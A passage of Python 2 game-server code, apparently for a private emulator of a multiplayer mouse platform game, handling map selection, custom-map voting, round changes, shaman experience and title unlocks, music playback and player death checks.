                            rrfRows = self.Database.fetchall()
                            if rrfRows is None:
                                pass
                            else:
                                for rrf in rrfRows:
                                    maplist.append(rrf[0])

                            if len(maplist) >= 1:
                                runthismap = random.choice(maplist)
                            else:
                                runthismap = ''
                            if len(maplist) >= 2:
                                while runthismap == self.ISCM:
                                    runthismap = random.choice(maplist)

                            if runthismap == '':
                                runthismap = random.choice(LEVEL_LIST)
                                while runthismap == self.currentWorld:
                                    runthismap = random.choice(LEVEL_LIST)

                                if self.specificMap:
                                    runthismap = self.currentWorld
                                return runthismap
                            else:
                                mapcode = int(runthismap)
                                mapname = self.server.getMapName(mapcode)
                                mapxml = self.server.getMapXML(mapcode)
                                yesvotes = int(self.server.getMapYesVotes(mapcode))
                                novotes = int(self.server.getMapNoVotes(mapcode))
                                perma = int(self.server.getMapPerma(mapcode))
                                mapnoexist = int(self.server.getMapDel(mapcode))
                                self.ISCM = mapcode
                                self.ISCMdata = [mapcode,
                                 mapname,
                                 mapxml,
                                 yesvotes,
                                 novotes,
                                 perma,
                                 mapnoexist]
                                return '-1'
                        elif self.ISCMstatus == 10:
                            maplist = []
                            self.Database.execute('select code from mapeditor where perma = 4')
                            rrfRows = self.Database.fetchall()
                            if rrfRows is None:
                                pass
                            else:
                                for rrf in rrfRows:
                                    maplist.append(rrf[0])

                            if len(maplist) >= 1:
                                runthismap = random.choice(maplist)
                            else:
                                runthismap = ''
                            if len(maplist) >= 2:
                                while runthismap == self.ISCM:
                                    runthismap = random.choice(maplist)

                            if runthismap == '':
                                runthismap = random.choice(LEVEL_LIST)
                                while runthismap == self.currentWorld:
                                    runthismap = random.choice(LEVEL_LIST)

                                if self.specificMap:
                                    runthismap = self.currentWorld
                                return runthismap
                            else:
                                mapcode = int(runthismap)
                                mapname = self.server.getMapName(mapcode)
                                mapxml = self.server.getMapXML(mapcode)
                                yesvotes = int(self.server.getMapYesVotes(mapcode))
                                novotes = int(self.server.getMapNoVotes(mapcode))
                                perma = int(self.server.getMapPerma(mapcode))
                                mapnoexist = int(self.server.getMapDel(mapcode))
                                self.ISCM = mapcode
                                self.ISCMdata = [mapcode,
                                 mapname,
                                 mapxml,
                                 yesvotes,
                                 novotes,
                                 perma,
                                 mapnoexist]
                                return '-1'
                        elif self.ISCMstatus == 11:
                            maplist = []
                            self.Database.execute('select code from mapeditor where perma = 6')
                            rrfRows = self.Database.fetchall()
                            if rrfRows is None:
                                pass
                            else:
                                for rrf in rrfRows:
                                    maplist.append(rrf[0])

                            if len(maplist) >= 1:
                                runthismap = random.choice(maplist)
                            else:
                                runthismap = ''
                            if len(maplist) >= 2:
                                while runthismap == self.ISCM:
                                    runthismap = random.choice(maplist)

                            if runthismap == '':
                                runthismap = random.choice(LEVEL_LIST)
                                while runthismap == self.currentWorld:
                                    runthismap = random.choice(LEVEL_LIST)

                                if self.specificMap:
                                    runthismap = self.currentWorld
                                return runthismap
                            else:
                                mapcode = int(runthismap)
                                mapname = self.server.getMapName(mapcode)
                                mapxml = self.server.getMapXML(mapcode)
                                yesvotes = int(self.server.getMapYesVotes(mapcode))
                                novotes = int(self.server.getMapNoVotes(mapcode))
                                perma = int(self.server.getMapPerma(mapcode))
                                mapnoexist = int(self.server.getMapDel(mapcode))
                                self.ISCM = mapcode
                                self.ISCMdata = [mapcode,
                                 mapname,
                                 mapxml,
                                 yesvotes,
                                 novotes,
                                 perma,
                                 mapnoexist]
                                return '-1'
                        else:
                            self.ISCMstatus = 0
                            runthismap = random.choice(LEVEL_LIST)
                            while runthismap == self.currentWorld:
                                runthismap = random.choice(LEVEL_LIST)

                            if self.specificMap:
                                runthismap = self.currentWorld
                            return runthismap
        return

    def closeVoting(self):
        self.initVotingMode = False
        self.votingBox = False
        if self.voteCloseTimer:
            try:
                self.voteCloseTimer.cancel()
            except:
                self.voteCloseTimer = None

        self.worldChange()
        return

    def worldChange(self):
        if self.killAfkTimer:
            try:
                self.killAfkTimer.cancel()
            except:
                self.killAfkTimer = None

        if self.initVotingMode:
            if self.votingBox:
                pass
            elif self.ISCMdata[5] == 0 and self.ISCM != -1:
                if self.isMiniGame:
                    self.votingMode = False
                    self.closeVoting()
                elif not self.isTribehouse:
                    if self.getPlayerCount() >= 2:
                        self.votingMode = True
                        self.votingBox = True
                        self.voteCloseTimer = reactor.callLater(8, self.closeVoting)
                        for playerCode, client in self.clients.items():
                            client.sendVoteBox(self.ISCMdata[1], self.ISCMdata[3], self.ISCMdata[4])

                    else:
                        self.votingMode = False
                        self.closeVoting()
                else:
                    self.votingMode = False
                    self.closeVoting()
            else:
                self.votingMode = False
                self.closeVoting()
        elif self.isEditeur and self.ISCMV == 0:
            pass
        elif self.isTribehouse and self.isTribehouseMap:
            pass
        else:
            if self.votingMode:
                TotalYes = self.ISCMdata[3] + self.recievedYes
                TotalNo = self.ISCMdata[4] + self.recievedNo
                if TotalYes + TotalNo >= 100:
                    TotalVotes = TotalYes + TotalNo
                    Rating = 1.0 * TotalYes / TotalVotes * 100
                    Rating, adecimal, somejunk = str(Rating).partition('.')
                    if int(Rating) < 50:
                        self.Database.execute('UPDATE mapeditor SET perma = ? WHERE code = ?', ['44', self.ISCMdata[0]])
                        self.Database.commit()
                self.Database.execute('UPDATE mapeditor SET yesvotes = ? WHERE code = ?', [int(TotalYes), self.ISCMdata[0]])
                self.Database.execute('UPDATE mapeditor SET novotes = ? WHERE code = ?', [int(TotalNo), self.ISCMdata[0]])
                self.Database.commit()
                self.votingMode = False
                self.recievedYes = 0
                self.recievedNo = 0
                for playerCode, client in self.clients.items():
                    client.Voted = False
                    client.QualifiedVoter = False

            self.initVotingMode = True
            self.currentSyncroniserCode = None
            self.isCurrentlyPlayingRoom = False
            self.identifiantTemporaire = -1
            NextCodePartie = self.CodePartieEnCours + 1
            if NextCodePartie > 9999:
                NextCodePartie = 1
            self.CodePartieEnCours = NextCodePartie
            self.CheckedPhysics = False
            NextCode_Partier = self.code_partier + 1
            if NextCode_Partier > 127:
                NextCode_Partier = 1
            self.code_partier = NextCode_Partier
            self.ISCMstatus += 1
            if self.isSurvivor:
                if self.ISCMstatus > 7:
                    self.ISCMstatus = 0
            elif self.ISCMstatus > 13:
                self.ISCMstatus = 0
            self.isHardSham = False
            self.isShamMode = [0, 0]
            for playerCode, client in self.clients.items():
                client.isAfk = True

            if self.isSurvivor and self.getPlayerCount(True) >= 3:
                for playerCode, client in self.clients.items():
                    if not client.isDead and not client.isZombie:
                        client.score += 10
                        client.shopcheese += 1
                        client.sendGainCurrency(0, 1)

            if self.isDefilante:
                for playerCode, client in self.clients.items():
                    client.score += client.defilantePoints

            if self.isCatchTheCheeseMap == True:
                self.isCatchTheCheeseMap = False
            else:
                if self.isDoubleMap:
                    numCompleted = self.FSnumCompleted - 1
                else:
                    numCompleted = self.numCompleted - 1
                if numCompleted < 0:
                    numCompleted = 0
                exp = 0
                if self.getPlayerCount(True) >= self.server.MinMiceExp:
                    for x in range(numCompleted):
                        exp += 10

                for playerCode, client in self.clients.items():
                    if client.playerCode == self.currentShamanCode:
                        if not client.username.startswith('*'):
                            pass
                        else:
                            exp = 0
                        client.score = numCompleted
                        if exp >= 10:
                            client.playerExp += exp
                            client.sendData('\x18\x01', struct.pack('!hh', exp, numCompleted), True)
                        break

                if self.currentShamanName:
                    self.sendAll('\x08\x11', [self.currentShamanName, numCompleted])
            if self.isDoubleMap:
                if self.isCatchTheCheeseMap == True:
                    self.isCatchTheCheeseMap = False
                else:
                    numCompleted = self.SSnumCompleted - 1
                    if numCompleted < 0:
                        numCompleted = 0
                    exp = 0
                    if self.getPlayerCount(True) >= self.server.MinMiceExp:
                        for x in range(numCompleted):
                            exp += 10

                    for playerCode, client in self.clients.items():
                        if client.playerCode == self.currentSecondShamanName:
                            if not client.username.startswith('*'):
                                pass
                            else:
                                exp = 0
                            client.score = numCompleted
                            if exp >= 10:
                                client.playerExp += exp
                                client.sendData('\x18\x01', struct.pack('!hh', exp, numCompleted), True)
                            break

                    if self.currentSecondShamanName:
                        self.sendAll('\x08\x11', [self.currentSecondShamanName, numCompleted])
            if self.isSurvivor:
                self.giveSurvivorStats()
            self.currentShamanCode = None
            self.currentSecondShamanCode = None
            self.currentShamanName = None
            self.currentSecondShamanName = None
            self.SurvivorVamp = False
            try:
                self.eventRoomFactory['halloween']['mobiles']['entry'] = {}
            except:
                pass

            for playerCode, client in self.clients.items():
                client.resetPlay()

            self.isDoubleMap = False
            self.anchors = []
            if not self.specificMap:
                if self.isTribehouse:
                    self.ISCM = self.tribehouseCM
                    self.ISCMdata = self.tribehouseCMdata
                    self.currentWorld = '-1'
                else:
                    runthismap = self.selectMap()
                    self.currentWorld = runthismap
            if self.RunEvent and int(self.getPlayerCount(True)) >= int(self.server.isNeedsForEvent):
                self.currentWorld = self.server.eventMap
            if self.currentWorld in (561,):
                if self.server.isChristmas:
                    self.isChristmasMap = True
                    self.RunEvent = False
            self.checkShouldNewCustomVanillaMaps()
            self.checkShouldNewCustomEventMaps()
            if int(self.currentWorld) in (44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 138, 139, 140, 141, 142, 143) and int(self.getPlayerCount()) >= 2:
                self.isDoubleMap = True
            if (self.ISCMdata[5] == 8 or self.ISCMdata[5] == 32) and int(self.getPlayerCount()) >= 2:
                self.isDoubleMap = True
            if self.currentWorld == 888:
                self.worldChangeTimer = reactor.callLater(60, self.worldChange)
            elif not self.roundTime == 0:
                self.worldChangeTimer = reactor.callLater(self.roundTime, self.worldChange)
            if not self.disablekillAfkTimer:
                self.killAfkTimer = reactor.callLater(30, self.killAfk)
            if self.autoRespawn or self.isTribehouseMap:
                if self.autoRespawnTimer:
                    try:
                        self.autoRespawnTimer.cancel()
                    except:
                        self.autoRespawnTimer = None

                self.autoRespawnTimer = reactor.callLater(5, self.respawnMice)
            self.gameStartTime = self.getTimer()
            self.numCompleted = 0
            self.FSnumCompleted = 0
            self.SSnumCompleted = 0
            self.numGotCheese = 0
            self.changed20secTimer = False
            self.isObjCount = 0
            self.isBoobleCount = 0
            self.disintegration = False
            self.isCloudId = False
            self.isCompanionBox = False
            self.bonfireID = None
            self.lastHandyMouseID = None
            self.lastHandyMouseByte = None
            self.AddTime = 0
            self.MiniGameTime = False
            self.CurrentTime = False
            if self.isTribehouse:
                self.isTribehouseMap = True
            for playerCode, client in self.clients.items():
                client.startPlay(-1, 0)
                if client.isHidden:
                    client.sendPlayerDisconnect(client.playerCode)
                if self.isMiniGame:
                    self.__updatePlayerInList(client)

            if self.isMiniGame:
                try:
                    self.GameScript.eventNewGame()
                except:
                    pass

                self.pushEventLoop()
            if self.isMulodrome:
                for playerCode, client in self.clients.items():
                    client.sendRoundMulodrome(self.currentRound, self.pTeamBlue, self.pTeamRed)

            elif self.isDefilante or self.isRacing:
                for playerCode, client in self.clients.items():
                    client.sendRoundLeader(self.currentRound, self.getLeaderCode())

            self.closeRoomRoundJoinTimer = reactor.callLater(2, self.closeRoomRoundJoin)
        return

    def getStartMusic(self):
        del self.playList[self.playerMusicCode]
        self.selectNextMusic()
        for playerCode, client in self.clients.items():
            client.MusicModule.playMusic()

    def selectNextMusic(self, nextMusic = False):
        TimeList = []
        playerMusic = False
        self.playerThisMusic.clear()
        self.playerMusicCode = None
        for k, v in self.playList.items():
            TimeList.append(k)

        for k, v in self.playList.items():
            if k == min(TimeList):
                self.playerMusicCode = k

        if self.playerMusicCode:
            self.playerThisMusic[self.playerMusicCode] = self.playList[self.playerMusicCode]
        if nextMusic:
            for playerCode, client in self.clients.items():
                client.MusicModule.playMusic()

        if self.playerMusicCode in self.playerThisMusic:
            nmTimer = int(self.playerThisMusic[self.playerMusicCode]['duration'])
            self.selectMusicTimer = reactor.callLater(nmTimer, self.getStartMusic)
        return

    def pushEventLoop(self):
        if self.isEventLoopTime:
            try:
                self.isEventLoopTime.cancel()
            except:
                self.isEventLoopTime = None

        self.isEventLoopTime = reactor.callLater(0.5, self.EventLoopTime)
        return

    def EventLoopTime(self):
        try:
            timeClock = int(round(self.getTimer() * 1000))
            currentTime = int(timeClock - self.gameStartTime * 1000)
            if not self.MiniGameTime:
                epoch = self.roundTime + self.AddTime
            else:
                if not self.CurrentTime:
                    self.CurrentTime = currentTime / 1000
                epoch = self.MiniGameTime + self.CurrentTime
            epoch = int(int(self.gameStartTime + epoch) * 1000)
            timeRemaining = epoch - timeClock
            self.GameScript.eventLoop(currentTime, timeRemaining)
            self.pushEventLoop()
        except Exception as err:
            print err

    def sendCalendar(self, day):
        self.sendAllBin('\x1a\x1d', struct.pack('!h', int(day)))

    def getTimer(self, x = 1):
        return thetime.time() / int(x)

    def getReactor(self, mode, kwargs):
        if mode in 'callLater':
            return reactor.callLater(*kwargs)

    def worldChangeSpecific(self, mapnumber, custom = None, special = None):
        mapnumber = int(mapnumber)
        self.identifiantTemporaire = -1
        NextCodePartie = self.CodePartieEnCours + 1
        if NextCodePartie > 9999:
            NextCodePartie = 1
        self.CodePartieEnCours = NextCodePartie
        NextCode_Partier = self.code_partier + 1
        if NextCode_Partier > 127:
            NextCode_Partier = 1
        self.code_partier = NextCode_Partier
        self.CheckedPhysics = False
        if self.worldChangeTimer:
            try:
                self.worldChangeTimer.cancel()
            except:
                self.worldChangeTimer = None

        if self.killAfkTimer:
            try:
                self.killAfkTimer.cancel()
            except:
                self.killAfkTimer = None

        self.currentSyncroniserCode = None
        self.isCurrentlyPlayingRoom = False
        self.isHardSham = False
        self.isShamMode = [0, 0]
        for playerCode, client in self.clients.items():
            client.isAfk = True

        if self.isSurvivor and self.getPlayerCount() >= 2:
            for playerCode, client in self.clients.items():
                if not client.isDead:
                    client.score += 10
                    client.shopcheese += 1
                    client.sendGainCurrency(0, 1)

        if self.isDefilante:
            for playerCode, client in self.clients.items():
                client.score += client.defilantePoints

        if self.isCatchTheCheeseMap == True:
            self.isCatchTheCheeseMap = False
        else:
            if self.isDoubleMap:
                numCompleted = self.FSnumCompleted - 1
            else:
                numCompleted = self.numCompleted - 1
            if numCompleted < 0:
                numCompleted = 0
            exp = 0
            if self.getPlayerCount(True) >= self.server.MinMiceExp:
                for x in range(numCompleted):
                    exp += 10

            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentShamanCode:
                    if not client.username.startswith('*'):
                        pass
                    else:
                        exp = 0
                    client.score = numCompleted
                    if exp >= 10:
                        client.playerExp += exp
                        client.sendData('\x18\x01', struct.pack('!hh', exp, numCompleted), True)
                    break

            if self.currentShamanName:
                self.sendAll('\x08\x11', [self.currentShamanName, numCompleted])
        if self.isDoubleMap:
            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentSecondShamanCode:
                    client.score = 0

            if self.isCatchTheCheeseMap == True:
                self.isCatchTheCheeseMap = False
            else:
                numCompleted = self.SSnumCompleted - 1
                if numCompleted < 0:
                    numCompleted = 0
                exp = 0
                if self.getPlayerCount(True) >= self.server.MinMiceExp:
                    for x in range(numCompleted):
                        exp += 10

                for playerCode, client in self.clients.items():
                    if client.playerCode == self.currentSecondShamanCode:
                        if not client.username.startswith('*'):
                            pass
                        else:
                            exp = 0
                        client.score = numCompleted
                        if exp >= 10:
                            client.playerExp += exp
                            client.sendData('\x18\x01', struct.pack('!hh', exp, numCompleted), True)
                        break

                if self.currentSecondShamanName:
                    self.sendAll('\x08\x11', [self.currentSecondShamanName, numCompleted])
        self.currentShamanCode = None
        self.currentSecondShamanCode = None
        self.currentShamanName = None
        self.currentSecondShamanName = None
        for playerCode, client in self.clients.items():
            client.resetPlay()

        self.isDoubleMap = False
        if special:
            self.currentWorld = self.selectMapSpecial(mapnumber)
        elif custom:
            self.currentWorld = self.selectMapSpecific(mapnumber, custom=True)
        else:
            self.currentWorld = self.selectMapSpecific(mapnumber, vanilla=True)
            self.ISCM = -1
            self.ISCMdata = [0,
             'Invalid',
             '<C><P /><Z><S /><D /><O /></Z></C>',
             0,
             0,
             0,
             0,
             0]
        if int(self.currentWorld) in (44, 45, 46, 47, 48, 49, 50, 51, 52, 53) and int(self.getPlayerCount()) >= 2:
            self.isDoubleMap = True
        if self.ISCMdata[5] == 8 and int(self.getPlayerCount()) >= 2:
            self.isDoubleMap = True
        if self.currentWorld == 888:
            self.worldChangeTimer = reactor.callLater(60, self.worldChange)
        elif not self.roundTime == 0:
            self.worldChangeTimer = reactor.callLater(self.roundTime, self.worldChange)
        if not self.disablekillAfkTimer:
            self.killAfkTimer = reactor.callLater(30, self.killAfk)
        self.checkShouldNewCustomVanillaMaps()
        self.checkShouldNewCustomEventMaps()
        self.gameStartTime = self.getTimer()
        self.numCompleted = 0
        self.numCompletedToGo = 0
        self.FSnumCompleted = 0
        self.SSnumCompleted = 0
        self.numGotCheese = 0
        self.changed20secTimer = False
        self.isObjCount = 0
        self.isBoobleCount = 0
        self.isCloudId = False
        self.isCompanionBox = False
        self.bonfireID = None
        self.lastHandyMouseID = None
        self.lastHandyMouseByte = None
        self.AddTime = 0
        self.MiniGameTime = False
        self.CurrentTime = False
        for playerCode, client in self.clients.items():
            client.startPlay(-1, 0)
            if self.isMiniGame:
                self.__updatePlayerInList(client)

        if self.isMulodrome:
            for playerCode, client in self.clients.items():
                client.sendRoundMulodrome(self.currentRound, self.pTeamBlue, self.pTeamRed)

        elif self.isDefilante or self.isRacing:
            for playerCode, client in self.clients.items():
                client.sendRoundLeader(self.currentRound, self.getLeaderCode())

        elif self.isMiniGame:
            try:
                self.GameScript.eventNewGame()
            except:
                pass

            self.pushEventLoop()
        self.closeRoomRoundJoinTimer = reactor.callLater(0, self.closeRoomRoundJoin)
        self.isTribehouseMap = False
        return

    def checkShouldNewCustomMapsXML(self, xml):
        mapcode = int(self.currentWorld)
        mapname = 'Tigrounette'
        mapxml = str(xml)
        mapnoexist = 0
        self.ISCM = mapcode
        self.ISCMdata = [mapcode,
         mapname,
         mapxml,
         0,
         0,
         2,
         mapnoexist]
        self.currentWorld = '-1'

    def checkShouldNewCustomEventMaps(self):
        code = self.currentWorld
        if os.path.exists('./Data/event/peche2014/' + str(code) + '.xml'):
            mapcode = int(self.currentWorld)
            mapname = '_peche'
            xfile = open('./Data/event/peche2014/' + str(code) + '.xml', 'r')
            mapxml = xfile.read()
            xfile.close()
            perma = 2
            mapnoexist = 0
            self.ISCM = mapcode
            self.ISCMdata = [mapcode,
             mapname,
             mapxml,
             0,
             0,
             perma,
             mapnoexist]
            self.currentWorld = '-1'

    def checkShouldNewCustomVanillaMaps(self):
        code = self.currentWorld
        if os.path.exists('./Data/vanilla/' + str(code) + '.xml'):
            mapcode = int(self.currentWorld)
            if str(code) == '561':
                mapname = '_No\xebl'
            elif str(code) == '562':
                mapname = '#Module'
            elif str(code) == '840':
                mapname = '_Carnaval'
            else:
                mapname = 'Tigrounette'
            xfile = open('./Data/vanilla/' + str(code) + '.xml', 'r')
            xml = xfile.read()
            xfile.close()
            mapxml = str(xml)
            mapnoexist = 0
            self.ISCM = 0 if str(code) == '562' else mapcode
            self.ISCMdata = [0 if str(code) == '562' else mapcode,
             mapname,
             mapxml,
             0,
             0,
             1 if str(code) in ('562',) else 2,
             mapnoexist]
            self.currentWorld = '-1'

    def checkShouldChangeWorld(self):
        if self.isBootcamp:
            pass
        elif self.isPlazza:
            pass
        elif self.isTribehouse and self.isTribehouseMap:
            pass
        elif self.currentWorld == 900:
            pass
        elif self.roundTime == 0:
            pass
        elif all((client.isDead for client in self.clients.values())):
            try:
                self.worldChangeTimer.cancel()
            except:
                self.worldChangeTimer = None

            if self.killAfkTimer:
                try:
                    self.killAfkTimer.cancel()
                except:
                    self.killAfkTimer = None

            if self.isMulodrome:
                self.currentRound += 1
                if self.currentRound >= 11:
                    for playerCode, client in self.clients.items():
                        client.sendPlaceMulodrome(self.currentRound, self.pTeamBlue, self.pTeamRed)

                    self.currentRound = 0
                    self.LeaderDrome = None
                    self.isRacing = False
                    self.isMulodrome = False
                    self.roundTime = 120
                    self.TeamDrome = {}
                    self.pTeamBlue = 0
                    self.pTeamRed = 0
            elif self.isDefilante or self.isRacing:
                self.currentRound += 1
                if self.currentRound >= 10:
                    self.currentRound = 0
            if self.closeRoomRoundJoinTimer:
                try:
                    self.closeRoomRoundJoinTimer.cancel()
                except:
                    self.closeRoomRoundJoinTimer = None

            if self.isChristmasMap:
                self.isChristmasMap = False
            self.worldChange()
        return

    def giveShamanDivineModeSave(self, Second = False):
        if int(self.getPlayerCount(True)) >= 3 and self.countStats:
            pass
        else:
            return 0
        if not Second:
            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentShamanCode:
                    client.divineModeSaves += 1
                    if client.privilegeLevel != 0:
                        if client.divineModeSaves in client.divineShamTitleCheckList:
                            unlockedtitle = client.divineShamTitleDictionary[client.divineModeSaves]
                            client.sendUnlockedTitle(client.playerCode, unlockedtitle)
                            client.DivineModeTitleList = client.DivineModeTitleList + [unlockedtitle]
                            if client.username == 'Kekool':
                                client.titleList = ['0,7'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                            else:
                                client.titleList = ['0'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                            if client.privilegeLevel == 10:
                                client.titleList = client.titleList + ['440',
                                 '442',
                                 '444',
                                 '445',
                                 '447',
                                 '448',
                                 '446']
                            client.titleList = filter(None, client.titleList)
                    return 1

        else:
            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentSecondShamanCode:
                    client.divineModeSaves += 1
                    if client.privilegeLevel != 0:
                        if client.divineModeSaves in client.divineShamTitleCheckList:
                            unlockedtitle = client.divineShamTitleDictionary[client.divineModeSaves]
                            client.sendUnlockedTitle(client.playerCode, unlockedtitle)
                            client.DivineModeTitleList = client.DivineModeTitleList + [unlockedtitle]
                            if client.username == 'Kekool':
                                client.titleList = ['0,7'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                            else:
                                client.titleList = ['0'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                            if client.privilegeLevel == 10:
                                client.titleList = client.titleList + ['440',
                                 '442',
                                 '444',
                                 '445',
                                 '447',
                                 '448',
                                 '446']
                            client.titleList = filter(None, client.titleList)
                    return 1

        return 0

    def giveShamanHardSave(self, Second = False):
        if int(self.getPlayerCount(True)) >= 3 and self.countStats:
            pass
        else:
            return 0
        if not Second:
            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentShamanCode:
                    client.hardModeSaves += 1
                    if client.privilegeLevel != 0:
                        if client.hardModeSaves in client.hardShamTitleCheckList:
                            unlockedtitle = client.hardShamTitleDictionary[client.hardModeSaves]
                            client.sendUnlockedTitle(client.playerCode, unlockedtitle)
                            client.HardModeTitleList = client.HardModeTitleList + [unlockedtitle]
                            if client.username == 'Kekool':
                                client.titleList = ['0,7'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                            else:
                                client.titleList = ['0'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                            if client.privilegeLevel == 10:
                                client.titleList = client.titleList + ['440',
                                 '442',
                                 '444',
                                 '445',
                                 '447',
                                 '448',
                                 '446']
                            client.titleList = filter(None, client.titleList)
                    return 1

        else:
            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentSecondShamanCode:
                    client.hardModeSaves += 1
                    if client.privilegeLevel != 0:
                        if client.hardModeSaves in client.hardShamTitleCheckList:
                            unlockedtitle = client.hardShamTitleDictionary[client.hardModeSaves]
                            client.sendUnlockedTitle(client.playerCode, unlockedtitle)
                            client.HardModeTitleList = client.HardModeTitleList + [unlockedtitle]
                            if client.username == 'Kekool':
                                client.titleList = ['0,7'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                            else:
                                client.titleList = ['0'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                            if client.privilegeLevel == 10:
                                client.titleList = client.titleList + ['440',
                                 '442',
                                 '444',
                                 '445',
                                 '447',
                                 '448',
                                 '446']
                            client.titleList = filter(None, client.titleList)
                    return 1

        return 0

    def giveShamanSave(self):
        if int(self.getPlayerCount(True)) >= 3 and self.countStats:
            pass
        else:
            return 0
        for playerCode, client in self.clients.items():
            if client.playerCode == self.currentShamanCode:
                client.micesaves += 1
                if client.privilegeLevel != 0:
                    if client.micesaves in client.shamanTitleCheckList:
                        unlockedtitle = client.shamanTitleDictionary[client.micesaves]
                        client.sendUnlockedTitle(client.playerCode, unlockedtitle)
                        client.ShamanTitleList = client.ShamanTitleList + [unlockedtitle]
                        if client.username == 'Kekool':
                            client.titleList = ['0,7'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                        else:
                            client.titleList = ['0'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                        if client.privilegeLevel == 10:
                            client.titleList = client.titleList + ['440',
                             '442',
                             '444',
                             '445',
                             '447',
                             '448',
                             '446']
                        client.titleList = filter(None, client.titleList)
                return 1

        return 0

    def giveSecondShamanSave(self):
        if int(self.getPlayerCount(True)) >= 3 and self.countStats:
            pass
        else:
            return 0
        for playerCode, client in self.clients.items():
            if client.playerCode == self.currentSecondShamanCode:
                client.micesaves += 1
                if client.privilegeLevel != 0:
                    if client.micesaves in client.shamanTitleCheckList:
                        unlockedtitle = client.shamanTitleDictionary[client.micesaves]
                        client.sendUnlockedTitle(client.playerCode, unlockedtitle)
                        client.ShamanTitleList = client.ShamanTitleList + [unlockedtitle]
                        if client.username == 'Kekool':
                            client.titleList = ['0,7'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                        else:
                            client.titleList = ['0'] + client.GiftTitleList + client.ShamanTitleList + client.HardModeTitleList + client.CheeseTitleList + client.FirstTitleList + client.ShopTitleList + client.BootcampTitleList + client.DivineModeTitleList
                        if client.privilegeLevel == 10:
                            client.titleList = client.titleList + ['440',
                             '442',
                             '444',
                             '445',
                             '447',
                             '448',
                             '446']
                        client.titleList = filter(None, client.titleList)
                return 1

        return 0

    def checkDeathCount(self):
        counts = [0, 0]
        for playerCode, client in self.clients.items():
            if client.isDead:
                counts[0] += 1
            else:
                counts[1] += 1

        return counts

    def checkDeathCountNoShaman(self):
        count = 0
        for playerCode, client in self.clients.items():
            if not client.isShaman:
                if client.isDead:
                    count += 1

        return count

    def checkIfTooFewRemaining(self):
        counts = [0, 0]
        for playerCode, client in self.clients.items():
            if client.isDead:
                counts[0] += 1
            else:
                counts[1] += 1

        if self.getPlayerCount() >= 2:
            if counts[1] <= 2:
                return True
        return False

    def checkIfOneFewRemaining(self):
        counts = [0, 0]
        for playerCode, client in self.clients.items():
            if client.isDead:
                counts[0] = counts[0] + 1
            else:
                counts[1] = counts[1] + 1

        if self.getPlayerCount >= 1:
            if counts[1] <= 1:
                return True
        return False

    def checkIfDoubleShamansAreDead(self):
        result = 0
        for playerCode, client in self.clients.items():
            if client.playerCode == self.currentShamanCode or client.playerCode == self.currentSecondShamanCode:
                if client.isShaman:
                    if client.isDead:
                        result += 1

        if result == 2:
            return True
        else:
            return False

    def checkIfDoubleShamanAreDead(self):
        result = 0
        for playerCode, client in self.clients.items():
            if client.playerCode == self.currentShamanCode or client.playerCode == self.currentSecondShamanCode:
                if client.isShaman:
                    if client.isDead:
                        result += 1

        if result == 1:
            return True
        else:
            return False

    def checkIfShamanIsDead(self):
        for playerCode, client in self.clients.items():
            if client.playerCode == self.currentShamanCode:
                if client.isDead:
                    if not client.isShaman:
                        return False
                    else:
                        return True
                else:
                    return False

        return True

    def checkIfShamanCanGoIn(self):
        allgone = 1
        for playerCode, client in self.clients.items():
            if client.playerCode != self.currentShamanCode:
                if client.isDead:
                    pass
                else:
                    allgone = 0

        if allgone == 1:
            return 1
        else:
            return 0

    def checkIfDoubleShamanCanGoIn(self):
        counts = [0,
         0,
         0,
         0]
        for playerCode, client in self.clients.items():
            if client.isDead:
                if client.playerCode == self.currentShamanCode:
                    counts[0] = counts[0] + 1
                elif client.playerCode == self.currentSecondShamanCode:
                    counts[0] = counts[0] + 1
                else:
                    counts[1] = counts[1] + 1
            elif client.playerCode == self.currentShamanCode:
                counts[2] = counts[2] + 1
            elif client.playerCode == self.currentSecondShamanCode:
                counts[2] = counts[2] + 1
            else:
                counts[3] = counts[3] + 1

        if counts[3] == 0:
            return True
        else:
            return False

    def resetRoom(self):
        if self.worldChangeTimer:
            try:
                self.worldChangeTimer.cancel()
            except:
                self.worldChangeTimer = None

        if self.killAfkTimer:
            try:
                self.killAfkTimer.cancel()
            except:
                self.killAfkTimer = None

        if self.autoRespawnTimer:
            try:
                self.autoRespawnTimer.cancel()
            except:
                self.autoRespawnTimer = None

        for playerCode, client in self.clients.items():
            resetpscore = 0
